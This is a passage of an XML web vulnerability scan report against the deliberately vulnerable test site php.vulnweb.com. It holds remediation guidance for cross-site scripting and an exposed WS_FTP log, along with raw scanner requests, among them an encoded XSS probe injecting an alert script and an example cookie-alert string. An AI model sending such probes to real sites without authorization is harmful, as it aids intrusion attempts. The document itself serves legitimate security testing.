Score</Name><SectionText><![CDATA[High]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed quickly, especially if the application is already in production.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[Cross-Site Scripting attacks can be avoided by carefully validating all input, and properly encoding all output. Validation can be done using standard ASP.NET Validation controls, or directly in your code. Do not attempt to sanitize input by removing script strings or characters, simply reject it. Always use as strict a pattern as you can possibly allow.<br /><br />
Encoding of output insures that any scriptable content is properly encoded for HTML before being sent to the client. This is done with the function HttpUtility.HtmlEncode, as shown in the following Label control sample:<br /><br />
	Label2.Text = HttpUtility.HtmlEncode(input)
<br /><br />Be sure to consider all paths that user input takes through your application. For instance, if data is entered by the user, stored in a database, and then redisplayed later, you must make sure it is properly encoded each time it is retrieved.If you must allow free-format text input, such as in a message board, and you wish to allow some HTML formatting to be used, you can handle this safely by explicitly allowing only a small list of safe tags. Here is an example of how to do this safely:<br /><br />
C# Example:<br /><br />
            StringBuilder sb = new StringBuilder(<br />
                HttpUtility.HtmlEncode(input)); <br />
            sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;"); <br />
            sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;"); <br />
            sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;"); <br />
            Response.Write(sb.ToString());<br /><br />

VB.NET Example: <br /><br />
        Dim sb As StringBuilder = New StringBuilder( _ <br />
                HttpUtility.HtmlEncode(input)) <br />
        sb.Replace("&amp;lt;b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;/b&amp;gt;", "&lt;b&gt;") <br />
        sb.Replace("&amp;lt;i&amp;gt;", "&lt;i&gt;") <br />
        sb.Replace("&amp;lt;/i&amp;gt;", "&lt;/i&gt;") <br />
        Response.Write(sb.ToString())<br /><br />

The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure what is being returned is what is expected, and is valid. </li><li>Use client-side validation when adding extra functionality to user input checking in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered " &lt;script&gt;alertdocumentcookie( 'aaa') &lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response, so that they cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms as opposed to single-factor authentication. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the web, or given to you by an acquaintance) for use in your own code. </li></ul>
Most server side scripting languages provide built in methods to convert the value of the input variable into correct, non-interpretable HTML. These should be used to sanitize all input before displayed to the client. 
<br /><br />
ASP / ASP.NET: Server.HTMLEncode (strHTML String)<br /><br />]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />The following recommendations will help you build web applications capable of withstanding Cross-Site Scripting attacks. 
<ul><li>Define what is allowed. Ensure that the Web application validates all input parameters (cookies, headers, query strings, forms, hidden fields, etc.) against a stringent definition of expected results. </li><li>Check the responses from POST and GET requests to ensure the data being returned is what is expected, and is valid. </li><li>When adding extra functionality to user-input checking, use client-side validation in addition to other forms of data checking. </li><li>Remove conflicting characters, brackets, and single and double quotes from user input by encoding user-supplied data. This will prevent inserted scripts from being sent to end users in a form that can be executed. </li><li>Whenever possible, limit all client-supplied data to alphanumeric data. Using this filtering scheme, if a user entered "&lt;script&gt;alertdocumentcookie('aaa')&lt;/script&gt;", it would be reduced to "scriptalertdocumentcookiescript". If non-alphanumeric characters must be used, encode them as HTML entities before using them in an HTTP response. Encoding ensures that the characters cannot be used to modify the structure of the HTML document. </li><li>Use two-factor customer authentication mechanisms, such as requiring a token and password, as opposed to single-factor authentication, such as requiring only a password. </li><li>Verify the origin of scripts before you modify or utilize them. </li><li>Do not implicitly trust any script given to you by others (whether downloaded from the Web or given to you by an acquaintance) for use in your own code. </li></ul>
The Java language does not have a built-in method to convert the value of the input variable into correct, non-interpretable HTML. The following code samples show two different ways of writing a utility method to sanitize all user input before displaying it back to the client. <br /><br /><br />
public static String HTMLEncode(String aTagFragment){ <br /><br />
  //make sure you replace &amp; first<br />
  aTagFragment = aTagFragment.replaceAll("&amp;", "&amp;amp;"); <br />
  aTagFragment = aTagFragment.replaceAll("&lt;", "&amp;lt;"); <br />
  aTagFragment = aTagFragment.replaceAll("&gt;", "&amp;gt;"); <br />
  aTagFragment = aTagFragment.replaceAll("\"", "&amp;quot;"); <br />
  aTagFragment = aTagFragment.replaceAll("'", "&amp;#39;"); <br />
  //replace backslash ‘\’ character<br />
  aTagFragment = aTagFragment.replaceAll("\\\\", "&amp;#92;"); <br /><br />
  return aTagFragment; <br />
}<br /><br />
public static String HTMLEncode(String aTagFragment){ <br />
  final StringBuffer result = new StringBuffer();<br />
  final StringCharacterIterator iterator = new StringCharacterIterator(aTagFragment); <br />
  char character = iterator.current();<br />
  while (character != StringCharacterIterator.DONE ){ <br />
   		if (character == '&lt;') { <br />
   			result.append("&amp;lt;"); <br />
   		} <br />
   		else if (character == '&gt;') { <br />
   			result.append("&amp;gt;"); <br />
   		} <br />
   		else if (character == '\"') { <br />
   			result.append("&amp;quot;"); <br />
   		} <br />
   		else if (character == '\'") { <br />
   			result.append("&amp;#39;"); <br />
   		} <br />
   		else if (character == '\\') { <br />
   			result.append("&amp;#92;"); <br />
   		} <br />
   		else if (character == '&amp;') { <br />
   			result.append("&amp;amp;"); <br />
   		} <br />
   		else { <br />
   			//the char is not a special one <br />
   			//add it to the result as is <br />
   			result.append(character); <br />
   		} <br />
   		character = iterator.next();<br />
   	} <br />
   	return result.toString();<br />
}]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText /></ReportSection></Issue></Issues><RawRequest id="55971BA851CE5DCD03B7513DF04D8048"><![CDATA[POST /secured/newuser.php HTTP/1.1
Referer: http://php.vulnweb.com/signup.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 242
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="55971BA851CE5DCD03B7513DF04D8048";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uaddress";AttackParamIndex="7";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="1707%2520Interdimensional%2520Street%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2533%2538%2531%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="379fbf04";
X-Request-Memo: ID="32b184b8";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

uuname=12345&upass=foo&upass2=foo&urname=12345&ucc=12345&uemail=John.Doe%40somewhere.com&uphone=770&uaddress=1707%20Interdimensional%20Street%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%33%38%31%31%29%3c%2f%73%43%72%49%70%54%3e&signup=signup]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:53:03 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 811

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street<sCrIpT>alert(43811)</sCrIpT></li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></RawResponse><Request id="55971BA851CE5DCD03B7513DF04D8048"><Method>POST</Method><Path>/secured/</Path><File>newuser</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData>uuname=12345&amp;upass=foo&amp;upass2=foo&amp;urname=12345&amp;ucc=12345&amp;uemail=John.Doe%40somewhere.com&amp;uphone=770&amp;uaddress=1707%20Interdimensional%20Street%3c%73%43%72%49%70%54%3e%61%6c%65%72%74%28%34%33%38%31%31%29%3c%2f%73%43%72%49%70%54%3e&amp;signup=signup</FullPostData><XMLPostData /><MultiPartPostData /><RawASCIIPostData /><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/signup.php</Value></Header><Header><Name>Content-Type</Name><Value>application/x-www-form-urlencoded</Value></Header><Header><Name>Content-Length</Name><Value>242</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="55971BA851CE5DCD03B7513DF04D8048";PSID="FAF765E4B6181822E8C9C961F9569838";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="2";AttackParamDesc="uaddress";AttackParamIndex="7";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="1707%2520Interdimensional%2520Street%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2534%2533%2538%2531%2531%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="379fbf04";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="32b184b8";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>add new user</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="masthead"> 
  <h1 id="siteName">ACUNETIX ART</h1> 
</div>
<div id="content">
	<p>You have been introduced to our database with the above informations:</p><ul><li>Username: 12345</li><li>Password: foo</li><li>Name: 12345</li><li>Address: 1707 Interdimensional Street<sCrIpT>alert(43811)</sCrIpT></li><li>E-Mail: John.Doe@somewhere.com</li><li>Phone number: 770</li><li>Credit card: 12345</li></ul><p>Now you can login from <a href='http://php.vulnweb.com/login.php'>here.</p></div>
</body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:53:03 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>811</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="FF4F1841AC44E4BC0B264B12BC57F3AC"><URL>http://php.vulnweb.com:80/pictures/WS_FTP.LOG</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="a8701264-c68d-40dd-8378-25499f418ef2"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>3850</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/WS_FTP.LOG HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="FF4F1841AC44E4BC0B264B12BC57F3AC";PSID="EC54310C1F88F6659328976C3D636498";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="764";Engine="Site+Search";SmartMode="4";tid="66";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="6b0ddcaf";
X-Request-Memo: ID="5bfdf94c";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>764</VulnerabilityID><Severity>2</Severity><Name>WS_FTP Log (ws_ftp.log)</Name><Classifications><Classification kind="7PK" identifier="Environment" href="https://vulncat.fortify.com/">Environment</Classification><Classification kind="7PK Category" identifier="Web Server Misconfiguration: Unprotected File" href="https://vulncat.fortify.com/">Web Server Misconfiguration: Unprotected File</Classification><Classification kind="CWE" identifier="CWE-538" href="https://cwe.mitre.org/data/definitions/538.html">CWE-538: File and Directory Information Exposure</Classification></Classifications><DetectionSelection><Location offset="9" length="3" /><Location offset="214" length="38" /><Location offset="345" length="77" /><Location offset="424" length="82" /><Location offset="508" length="100" /><Location offset="610" length="80" /><Location offset="692" length="82" /><Location offset="776" length="82" /><Location offset="860" length="84" /><Location offset="946" length="88" /><Location offset="1036" length="78" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[A serious WS_FTP vulnerability was identified within your web application.  WS_FTP is a popular FTP client for Windows which is utilized by system administrators and developers to upload and download files from web servers, with each transfer notated in a log file by default.  Risks associated with an attacker discovering a WS-FTP log file result from the fact that files that should remain hidden, such as administrative or maintenance applications, web application configuration files, or application data files, may then be visible.  Recommendations include removing the WS_FTP log file from the application server and configuring WS_FTP so that it does not create log files.



]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
When WS_FTP is used to transfer files, a log file called 'ws_ftp.log' is created on the server.  This log file contains records of every file that is accessed by WS_FTP, which could possibly contain very valuable information to an attacker because it may list files that are otherwise "hidden."  This often includes administrative or maintenance applications, web application configuration files, applications-in-development, backed-up application source code and possible application data files.

<br /><br />


Primarily, WS_FTP log files are valuable to attackers because they display all files in a directory, not just ones that are intended to be used.  How easy is it for an attacker to take advantage of an insecure web application via the discovery of a WS_FTP log file on your web application server?  Often, this is as simple as typing in the name of the file garnered directly from the WS_FTP log files.  In essence, gaining access to a WS_TP log file greatly reduces the amount of effort a potential attacker must employ to gain knowledge of your web application.

<br /><br />


A fundamental necessity for a successful attack upon your web application is reconnaissance.  An attacker will employ a variety of methods, including malicious scanning agents and Google searches, to find out as much information about your web application as possible.  That information can then be utilized when the attacker is formulating his next method of attack.  An attacker who finds a WS_FTP log files has had a large portion of his reconnaissance conducted for him.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />
Click the following link to examine the contents of the WS_FTP log file discovered on your web application server. <br /><br /><br /><a href="~FullURL~">~FullURL~</a>]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br /><b>For Development:</b><br />


Unless you are actively involved with implementing the web application server, there is not a wide range of available solutions to prevent problems that can occur from an attacker finding a WS_FTP log file.  Primarily, this problem will be resolved by the web application server administrator.  However, there are certain actions you can take that will help to secure your web application.


<ul><li>Restrict access to important files or directories only to those who actually need it.</li><li>Ensure that files containing sensitive information are not left publicly accessible, or that comments left inside files do not 

reveal the locations of directories best left confidential. </li></ul><b>For Security Operations:</b><br />
There are two primary actions to take to eliminate the risk of a WS_FTP log file vulnerability.<ul><li>Manually remove the WS_FTP log file from the application server. </li><li>Configure WS_FTP so that it does not create log files on servers. </li></ul>One of the most important aspects of web application security is to restrict access to important files or directories only to those individuals who actually need to access them.  Ensure that the private architectural structure of your web application is not exposed to anyone who wishes to view it as even seemingly innocuous directories can provide important information to a potential attacker.

<br /><br />

The following recommendations can help to ensure that you are not unintentionally allowing access to either information that could be utilized in conducting an attack or propriety data stored in publicly accessible directories. 
<ul><li>Ensure that files containing sensitive information are not left publicly accessible, or that comments left inside files do not reveal the locations of directories best left confidential. </li><li>Restrict access to important files or directories only to those who actually need it.</li><li>Don't follow standard naming procedures for hidden directories.  For example, don't create a hidden directory called "cgi" that contains cgi scripts.  Obvious directory names are just that...readily guessed by an attacker. </li></ul>

Remember, the harder you make it for an attacker to access information about your web application, the more likely it is that he will simply find an easier target. 

<br /><br /><b>For QA: </b><br />
For reasons of security, it is important to test the web application not only from the perspective of a normal user, but also from that of a malicious one.  Whenever possible, adopt the mindset of an attacker when testing your web application for security defects.  Access your web application from outside your firewall or IDS.  Utilize Google or another search engine to ensure that searches for vulnerable files do not return information from regarding your web application.  For example, an attacker will utilize a search engine, and search for directory listings such as the following: "index of / cgi-bin".  Make sure that your directory structure is not obvious, and that only files that are necessary are capable of being accessed.]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>IIS:</b><br /><a href="http://www.microsoft.com/resources/documentation/WindowsServ/2003/standard/proddocs/en-us/Default.asp?url=/resou  rces/documentation/WindowsServ/2003/standard/proddocs/en-us/qss_ftp_ftpsitesetup.asp">Microsoft IIS FTP Information</a><br /><br /><b>General:</b><br /><a href="http://www.hwg.org/lists/hwg-servers/passwords.html">Password-protecting web 

pages</a><br /><a href="http://msdn.microsoft.com/library/default.asp?url=/library/en-us/secmod/html/secmod71.asp">Web 

Security</a><br /><a href="http://webdesign.about.com/od/ftp/index_a.htm">FTP Clients</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="FF4F1841AC44E4BC0B264B12BC57F3AC"><![CDATA[GET /pictures/WS_FTP.LOG HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="FF4F1841AC44E4BC0B264B12BC57F3AC";PSID="EC54310C1F88F6659328976C3D636498";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="764";Engine="Site+Search";SmartMode="4";tid="66";tt="11";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="6b0ddcaf";
X-Request-Memo: ID="5bfdf94c";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:53:59 GMT
ETag: "497996bd-303"
Server: nginx/1.19.0
X-Cache: MISS from 189.9.60.27
Connection: keep-alive
Content-Type: application/octet-stream
Accept-Ranges: bytes
Last-Modified: Fri, 23 Jan 2009 10:06:53 GMT
Content-Length: 771

103.05.06 13:17 B d:\smz\_notes\colors.xml <-- mathsmz /smz/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\colors.xml --> duh.xtech.ru /SMZ/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\dwSiteColumnsMe.xml --> duh.xtech.ru /SMZ/_notes dwSiteColumnsMe.xml
103.05.06 13:33 B D:\SMZ\_notes\flash.xml --> duh.xtech.ru /SMZ/_notes flash.xml
103.05.06 13:33 B D:\SMZ\_notes\images.xml --> duh.xtech.ru /SMZ/_notes images.xml
103.05.06 13:33 B D:\SMZ\_notes\movies.xml --> duh.xtech.ru /SMZ/_notes movies.xml
103.05.06 13:33 B D:\SMZ\_notes\scripts.xml --> duh.xtech.ru /SMZ/_notes scripts.xml
103.05.06 13:33 B D:\SMZ\_notes\shockwave.xml --> duh.xtech.ru /SMZ/_notes shockwave.xml
103.05.06 13:33 B D:\SMZ\_notes\urls.xml --> duh.xtech.ru /SMZ/_notes urls.xml
]]></RawResponse><Request id="FF4F1841AC44E4BC0B264B12BC57F3AC"><Method>GET</Method><Path>/pictures/</Path><File>WS_FTP</File><Ext>LOG</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/pictures/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="FF4F1841AC44E4BC0B264B12BC57F3AC";PSID="EC54310C1F88F6659328976C3D636498";SessionType="AuditAttack";CrawlType="None";AttackType="Search";OriginatingEngineID="60b8f839-2e70-4177-8e47-f305852be435";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="764";Engine="Site+Search";SmartMode="4";tid="66";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="31";smi="0";sc="1";ID="6b0ddcaf";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="5bfdf94c";sc="1";tid="41";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[103.05.06 13:17 B d:\smz\_notes\colors.xml <-- mathsmz /smz/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\colors.xml --> duh.xtech.ru /SMZ/_notes colors.xml
103.05.06 13:33 B D:\SMZ\_notes\dwSiteColumnsMe.xml --> duh.xtech.ru /SMZ/_notes dwSiteColumnsMe.xml
103.05.06 13:33 B D:\SMZ\_notes\flash.xml --> duh.xtech.ru /SMZ/_notes flash.xml
103.05.06 13:33 B D:\SMZ\_notes\images.xml --> duh.xtech.ru /SMZ/_notes images.xml
103.05.06 13:33 B D:\SMZ\_notes\movies.xml --> duh.xtech.ru /SMZ/_notes movies.xml
103.05.06 13:33 B D:\SMZ\_notes\scripts.xml --> duh.xtech.ru /SMZ/_notes scripts.xml
103.05.06 13:33 B D:\SMZ\_notes\shockwave.xml --> duh.xtech.ru /SMZ/_notes shockwave.xml
103.05.06 13:33 B D:\SMZ\_notes\urls.xml --> duh.xtech.ru /SMZ/_notes urls.xml
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:53:59 GMT</Value></Header><Header><Name>ETag</Name><Value>"497996bd-303"</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>X-Cache</Name><Value>MISS from 189.9.60.27</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>application/octet-stream</Value></Header><Header><Name>Accept-Ranges</Name><Value>bytes</Value></Header><Header><Name>Last-Modified</Name><Value>Fri, 23 Jan 2009 10:06:53 GMT</Value></Header><Header><Name>Content-Length</Name><Value>771</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="0392F644AF4E40AD40F8C7BF357F9610"><URL>http://php.vulnweb.com:80/pictures/4.jpg.tn/%37%33%33%34%37</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="28dad6df-f1c5-4748-9e5a-f805bd3294ee"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /pictures/4.jpg.tn/%37%33%33%34%37 HTTP/1.1
Referer: http://php.vulnweb.com/pictures/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0392F644AF4E40AD40F8C7BF357F9610";PSID="2911F93E6093F658C9231D0E8F48A053";SessionType="AuditAttack";CrawlType="None";AttackType="UrlComponentManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="26";AttackParamDesc="";AttackParamIndex="2";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%2537%2533%2533%2534%2537";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="97135714";
X-Request-Memo: ID="3945d6d5";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2000" length="5" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
